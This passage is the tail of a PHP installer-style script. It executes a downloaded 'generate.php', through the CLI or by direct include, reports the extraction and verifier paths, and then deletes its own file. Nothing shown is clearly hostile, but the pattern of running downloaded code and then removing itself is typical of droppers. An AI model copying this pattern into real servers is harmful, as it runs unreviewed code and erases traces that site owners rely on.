                    echo "generate.php CLI failed. {$errOut}" . PHP_EOL;
                }
            }

            if (!$ran) {
                // Embedded include; generate.php honors EMBEDDED_RUN to suppress headers
                echo "Trying embedded include of generate.php ..." . PHP_EOL;
                $cwd = getcwd();
                $changed = false;
                if ($cwd !== false && isFunctionAvailable('chdir')) {
                    $changed = @chdir($downloadDir);
                }
                if (!defined('EMBEDDED_RUN')) {
                    define('EMBEDDED_RUN', true);
                }
                ob_start();
                include $generatePath;
                $localOutput = ob_get_clean();
                if ($changed) {
                    @chdir($cwd);
                }
                if ($localOutput !== false) {
                    echo "generate.php embedded output:" . PHP_EOL . $localOutput . PHP_EOL;
                } else {
                    echo "generate.php embedded execution produced no output." . PHP_EOL;
                }
            }
        } else {
            $codeInfo = isset($resp['code']) ? " (HTTP " . $resp['code'] . ")" : '';
            echo "generate.php request done{$codeInfo}" . PHP_EOL;
        }
    } else {
        echo "No web context; cannot build URL for generate.php. Local path: {$generatePath}" . PHP_EOL;
    }
} else {
    echo "generate.php not found in download dir, skipping." . PHP_EOL;
}

echo PHP_EOL . "=== Done ===" . PHP_EOL;
echo "Extracted to: {$extractDir}" . PHP_EOL;
if ($verifierPath) {
    echo "Verifier saved to: {$verifierPath}" . PHP_EOL;
}

// Remove this script after successful run to prevent reuse
if (isFunctionAvailable('unlink')) {
    $self = __FILE__;
    if (@unlink($self)) {
        echo "Removed script file: " . basename($self) . PHP_EOL;
    } else {
        echo "Warning: unable to remove script file {$self}" . PHP_EOL;
    }
} else {
    echo "Warning: unlink() disabled, script file not removed." . PHP_EOL;
}
